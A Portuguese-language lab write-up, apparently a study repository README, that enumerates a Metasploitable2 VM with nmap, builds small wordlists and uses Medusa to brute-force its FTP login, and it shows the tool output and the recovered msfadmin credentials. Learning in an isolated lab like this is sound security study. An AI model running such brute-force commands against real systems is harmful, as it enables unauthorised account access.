# Medusa
Estudo de força bruta utilizando a ferramenta Medusa

Primeiros passos na utilização do Medusa, configuramos o Kali Linus e o Metasploitable2, configuramos também a rede interna dos 2 para host-only. 

Em seguida, iniciamos o Metasploitable2 e executamos o comando ( ip a ), para ver o ip do Metasploitable2.

Com o ip em mãos, acessamos o Kali e fazemos um enumeração para ver quais serviços estão rodando, portanto, utilizamos o nmap para isso, o comando: nmap -sV -p 21,22,80,445139 ip ( Na parte que está escrito ip, é o ip da outra máquina )

Após isso, identificamos o serviço ftp rodando, tentando acessar usando o comando: ftp ip ( novamente a parte do ip é o número de ip da outra máquina ).

Pediu o nome e a senha da outra máquina, portando vamos usar a ferramenta medusa para conseguir encontrar esses dois campos. 

Primeira coisa: Criamos a Wordlist que vamos utilizar, vão ser 2 onde uma vai conter user e a outra password.

Comando user: echo -e "user\nmsfadmin\nadmin\nroot" > user.txt
Comando Password: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Com as duas Wordlist criadas, podemos dar continuidade na Medusa.

Comando Medusa: medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6

Retornando o resultado: 

ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: 123456 (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: qwerty (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

Quando retorna o resultado: ACCOUNT FOUND, significa que foi o sucesso.

Dando continuidade, utilizamos o comando: ftp 192.168.56.101 
Quando pedir o nome e password, usamos o que retornou succes: User: msfadmin Password: msfadmin

Por fim, conseguimos acessar!
